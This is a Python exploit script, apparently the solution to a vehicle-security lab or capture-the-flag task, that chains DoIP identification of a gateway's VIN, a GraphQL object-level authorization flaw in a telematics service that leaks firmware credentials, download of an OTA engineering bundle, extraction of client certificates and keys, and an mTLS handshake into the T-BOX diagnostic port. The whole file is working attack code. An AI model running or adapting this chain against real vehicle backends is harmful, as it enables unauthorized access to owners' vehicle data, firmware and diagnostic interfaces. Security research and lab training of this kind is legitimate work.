#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Task 01 - 云侧对象级越权与 OTA 定位
Chain:
  1) DoIP vehicle identification via CGW -> real VIN
  2) TSP GraphQL object-level auth flaw: vehicleDiagnostics + variables.vin
     returns any registered vehicle's OTA diagnostics (query arg is decorative)
  3) Download OTA engineering bundle from T-BOX with Basic diag:<firmwareCredential>
  4) Unpack: manifest.json + diagnostics/{ca,client,client-key}.pem + vcu-reference.bin + tbox-firmware.img
  5) Prove diagnostic entry: mTLS to https://<tbox>:8443 with bundle client cert
"""
import json, os, socket, struct, subprocess, sys, hashlib, zipfile, shutil
import requests

CGW   = ("10.226.193.2", 13400)
TSP   = "http://10.225.139.2:8080/graphql"
TBOX  = "http://10.225.139.3:8080"
TBOX8443 = "10.225.139.3"
OUT   = "06_WRITEUP/01-tsp-bola/artifacts"

def doip_vin():
    s = socket.socket(); s.settimeout(5); s.connect(CGW)
    s.sendall(bytes([0x02, 0xFD]) + struct.pack(">H", 0x0001) + struct.pack(">I", 0))
    d = b""
    while len(d) < 8:
        d += s.recv(8 - len(d))
    ln = struct.unpack(">I", d[4:8])[0]
    body = b""
    while len(body) < ln:
        body += s.recv(ln - len(body))
    s.close()
    return body[:17].decode(), struct.unpack(">H", body[17:19])[0]

def gql_diag(vin):
    # NOTE: matcher keys on variables.vin; the query argument itself is decorative
    body = {"query": 'query { vehicleDiagnostics { vin } }', "variables": {"vin": vin}}
    r = requests.post(TSP, json=body, timeout=8)
    r.raise_for_status()
    return r.json()

def download_bundle(cred):
    url = TBOX + "/api/v1/ota/engineering-bundle"
    r = requests.get(url, auth=("diag", cred), timeout=15)
    r.raise_for_status()
    return r.content

def main():
    os.makedirs(OUT, exist_ok=True)
    vin, la = doip_vin()
    print(f"[1] DoIP VIN={vin} gatewayLA=0x{la:04x}")

    diag = gql_diag(vin)
    node = diag["data"]["vehicleDiagnostics"]
    print(f"[2] TSP BOLA -> campaign={node['campaignId']}")
    print(f"    ota={node['firmwareDownload']}  diagEndpoint={node['diagnosticEndpoint']}")
    print(f"    tbox={node['tboxEndpoint']}  firmwareCredential={node['firmwareCredential'][:8]}...")
    print(f"    packageKey={node['packageKey'][:16]}...")
    print(f"    manifest={node['manifest']}")

    blob = download_bundle(node["firmwareCredential"])
    zpath = os.path.join(OUT, "cv6-engineering-bundle.zip")
    open(zpath, "wb").write(blob)
    print(f"[3] bundle {len(blob)}B sha256={hashlib.sha256(blob).hexdigest()}")

    ext = os.path.join(OUT, "extracted")
    shutil.rmtree(ext, ignore_errors=True)
    os.makedirs(ext, exist_ok=True)
    zipfile.ZipFile(zpath).extractall(ext)
    names = sorted(os.path.relpath(os.path.join(r, f), ext) for r, d, fs in os.walk(ext) for f in fs)
    print(f"[4] unpacked: {names}")
    mani = json.load(open(os.path.join(ext, "manifest.json")))
    print("    manifest:", json.dumps(mani, ensure_ascii=False))

    # [5] diagnostic entry: mTLS handshake using the bundle's client cert
    cmd = ["openssl", "s_client", "-connect", f"{TBOX8443}:8443",
           "-cert", os.path.join(ext, "diagnostics/client.pem"),
           "-key",  os.path.join(ext, "diagnostics/client-key.pem"),
           "-CAfile", os.path.join(ext, "diagnostics/ca.pem"),
           "-servername", "tbox", "-brief"]
    try:
        p = subprocess.run(cmd, input=b"", capture_output=True, timeout=10)
        out = (p.stdout + p.stderr).decode(errors="replace")
        ok = "Verify return code: 0 (ok)" in out or "Verification: OK" in out
        print(f"[5] mTLS verify={'OK' if ok else 'FAIL'}")
        print("    " + " | ".join(l for l in out.splitlines() if "Verify" in l or "Protocol" in l)[:400])
    except Exception as e:
        print("[5] openssl error", e)

    json.dump({"vin": vin, "diagnostics": node, "manifest": mani},
              open(os.path.join(OUT, "task01_result.json"), "w"), ensure_ascii=False, indent=2)
    print(f"[+] result -> {OUT}/task01_result.json")

if __name__ == "__main__":
    main()
